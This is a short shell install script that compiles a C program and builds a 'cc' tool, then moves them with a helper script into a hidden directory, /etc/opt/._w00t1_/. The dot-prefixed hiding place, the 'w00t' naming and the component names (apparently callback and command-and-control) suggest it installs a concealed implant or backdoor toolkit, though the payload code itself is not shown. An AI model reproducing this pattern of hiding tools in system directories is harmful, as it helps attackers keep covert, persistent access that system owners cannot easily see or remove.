#!/bin/sh
#

set -x;

# shini base dir
SHINI_PATH="/etc/opt"

# prefix
SHINI_PREFIX="._w00t1_";

# ._w00t1_helper
SHINI_HELPER=$SHINI_PREFIX"helper";

# ._w00t1_cb
SHINI_CB=$SHINI_PREFIX"cb";

# ._w00t1_cc
SHINI_CC=$SHINI_PREFIX"cc";

if [ ! -d "$SHINI_PATH" ]; then
    mkdir $SHINI_PATH
fi

# /etc/opt/._w00t1_/
SHINI_DIR=$SHINI_PATH"/"$SHINI_PREFIX"/";

# compile cb
gcc ./cb/src/cb.c -o $SHINI_CB;

# make cc (lame :/)
cd ./cc/build/
make
cd ../../

# copy tools
cp "./cb/scripts/helper" $SHINI_HELPER
cp "./cc/build/cc"       $SHINI_CC

# create the directory
mkdir $SHINI_DIR;

# move to shini directory
mv $SHINI_CB $SHINI_HELPER $SHINI_CC $SHINI_DIR;

